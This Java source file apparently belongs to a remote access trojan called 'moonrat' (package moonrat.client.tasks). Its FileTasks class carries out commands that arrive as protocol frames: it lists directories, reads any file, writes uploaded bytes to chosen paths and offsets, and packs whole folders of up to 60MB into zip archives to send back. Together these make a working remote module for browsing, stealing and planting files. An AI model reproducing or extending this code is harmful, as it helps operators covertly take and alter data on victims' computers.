package moonrat.client.tasks;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class FileTasks {
    private static final long ZIP_LIMIT = 60L * 1024 * 1024;
    private static final long ZIP_FILE_LIMIT = 32L * 1024 * 1024;

    private FileTasks() {}

    public static Frame list(String path) {
        Frame response = new Frame(Protocol.LS_RESP);
        try {
            Path directory = Paths.get(path);
            List<Path> entries = new ArrayList<>();
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(directory)) {
                for (Path entry : stream) entries.add(entry);
            }

            entries.sort((left, right) -> {
                boolean leftDirectory = Files.isDirectory(left);
                boolean rightDirectory = Files.isDirectory(right);
                if (leftDirectory != rightDirectory) return leftDirectory ? -1 : 1;
                return left.getFileName().toString().compareToIgnoreCase(right.getFileName().toString());
            });

            StringBuilder listing = new StringBuilder();
            for (Path entry : entries) {
                boolean directoryEntry = Files.isDirectory(entry);
                long size = 0;
                try {
                    if (!directoryEntry) size = Files.size(entry);
                } catch (IOException ignored) {
                }
                listing.append(entry.getFileName())
                        .append('\t')
                        .append(directoryEntry ? '1' : '0')
                        .append('\t')
                        .append(size)
                        .append('\n');
            }

            response.fields = new ArrayList<>(Arrays.asList("", directory.toString(), listing.toString()));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(Arrays.asList(String.valueOf(failure), path, ""));
        }
        return response;
    }

    public static Frame read(String path) {
        Frame response = new Frame(Protocol.GET_RESP);
        try {
            Path file = Paths.get(path);
            byte[] data = Files.readAllBytes(file);
            response.fields = new ArrayList<>(Arrays.asList("", file.getFileName().toString()));
            response.blob = data;
        } catch (Exception failure) {
            response.fields = new ArrayList<>(Arrays.asList(String.valueOf(failure), ""));
        }
        return response;
    }

    public static Frame write(String path, byte[] data, long offset) {
        Frame response = new Frame(Protocol.PUT_RESP);
        try {
            Path file = Paths.get(path);
            try (FileChannel channel = FileChannel.open(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE)) {
                if (offset == 0) channel.truncate(0);
                ByteBuffer buffer = ByteBuffer.wrap(data);
                long position = offset;
                while (buffer.hasRemaining()) position += channel.write(buffer, position);
            }
            response.fields = new ArrayList<>(Arrays.asList(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(Arrays.asList(String.valueOf(failure)));
        }
        return response;
    }

    public static Frame zip(String path) {
        Frame response = new Frame(Protocol.ZIP_RESP);
        try {
            Path root = Paths.get(path).toAbsolutePath();
            if (!Files.isDirectory(root)) throw new IOException("not a directory");

            ByteArrayOutputStream archive = new ByteArrayOutputStream(1 << 20);
            long[] total = {0};
            boolean[] overflow = {false};

            try (ZipOutputStream zip = new ZipOutputStream(archive)) {
                addToZip(zip, root, root, total, overflow);
            }

            String base = root.getFileName() == null ? "root" : root.getFileName().toString();
            response.fields = new ArrayList<>(Arrays.asList(
                    overflow[0] ? "folder exceeds 60MB - pull files individually" : "",
                    base + ".zip"));
            response.blob = archive.toByteArray();
        } catch (Exception failure) {
            response.fields = new ArrayList<>(Arrays.asList(String.valueOf(failure), ""));
        }
        return response;
    }

    private static void addToZip(ZipOutputStream zip, Path root, Path path, long[] total, boolean[] overflow)
            throws IOException {
        if (Files.isSymbolicLink(path)) return;

        if (Files.isDirectory(path)) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                for (Path entry : stream) addToZip(zip, root, entry, total, overflow);
            } catch (IOException skipped) {
                return;
            }
            return;
        }

        if (!Files.isRegularFile(path)) return;

        long size = Files.size(path);
        if (size > ZIP_FILE_LIMIT) return;
        if (total[0] + size > ZIP_LIMIT) {
            overflow[0] = true;
            return;
        }

        String name = root.relativize(path).toString().replace('\\', '/');
        zip.putNextEntry(new ZipEntry(name));
        Files.copy(path, zip);
        zip.closeEntry();
        total[0] += size;
    }
}
